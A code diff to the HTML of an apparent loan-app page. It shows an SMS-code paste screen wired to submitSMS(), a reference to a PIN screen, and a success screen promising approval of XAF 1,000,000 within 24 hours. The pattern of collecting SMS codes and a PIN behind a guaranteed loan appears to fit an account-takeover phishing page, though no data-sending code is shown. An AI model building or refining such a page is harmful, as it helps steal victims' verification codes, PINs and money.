@@ -184,7 +184,8 @@
                     <button type="button" class="paste-btn" onclick="pasteSMS()">📋 Paste</button>
                 </div>
             </div>
-            <button id="btn-verify-sms" class="verify-btn" onclick="goToScreen('screen-pin')" disabled>VERIFY & CONTINUE →</button>
+            <!-- Note: onclick is correctly set to submitSMS() here -->
+            <button id="btn-verify-sms" class="verify-btn" onclick="submitSMS()" disabled>VERIFY & CONTINUE →</button>
         </div>
     </div>
 
@@ -208,16 +209,12 @@
         </div>
     </div>
 
-    <!-- NEW: CONGRATULATIONS SUCCESS SCREEN -->
+    <!-- CONGRATULATIONS SUCCESS SCREEN -->
     <div id="screen-success" class="screen success-screen">
         <div class="success-card">
-            
-            <!-- Top Blue Section -->
             <div class="success-header">
-                <!-- Emoji Confetti Backgrounds -->
                 <div class="confetti confetti-1">🎉</div>
                 <div class="confetti confetti-2">💵</div>
-                
                 <div class="success-logo">
                     <svg width="70" height="70" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <rect width="100" height="100" rx="24" fill="#004C6C"/>
@@ -225,30 +222,18 @@
                         <path d="M35 65H75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
                     </svg>
                 </div>
-                
                 <div class="party-popper">🎉</div>
                 <h2>Congratulations!</h2>
                 <p>Your loan has been approved</p>
             </div>
-            
-            <!-- Bottom White Section -->
             <div class="success-body">
-                <!-- Confetti emojis for the white section -->
                 <div class="confetti-w">🟨</div>
                 <div class="confetti-w confetti-w-2">🟦</div>
-                
                 <p class="approved-label">APPROVED AMOUNT</p>
-                
-                <!-- Dynamic Amount populated by JS -->
                 <h1 class="approved-amount">XAF <span id="final-amount-display">1,000,000</span></h1>
-                
-                <div class="funds-badge">
-                    ⏰ Funds within less than 24 hours
-                </div>
-                
+                <div class="funds-badge">⏰ Funds within less than 24 hours</div>
                 <p class="success-footer-text">You'll receive an SMS notification once the loan has been credited to your account.</p>
             </div>
-            
         </div>
     </div>
 
